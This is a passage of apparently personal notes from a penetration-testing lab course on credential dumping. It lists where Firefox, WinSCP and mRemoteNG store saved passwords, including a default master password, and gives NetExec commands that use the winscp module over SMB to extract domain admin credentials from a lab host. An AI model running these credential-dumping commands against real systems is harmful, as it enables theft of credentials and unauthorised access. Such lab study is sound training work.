often use custom algorithms, or no protection
- firefox - SQLite (no master password by default)
- WinSCP - encoded passwords (no master password by default)
- mRteoteNG - XML file (default master password: mR3m)

there exists many credential dumping modules in NetExec, just search for and try them
`nxc smb <IP> -u <user> -p <pass> -M winscp`


### Learning Objective 22
**Extract DA creds from WinSCP on LINEOPS-DB01 machine**
`nxc smb 172.16.13.26 -u ryan.young -p <pass> --local-auth -M winscp`
![](assets/Pasted%20image%2020260724111101.png)

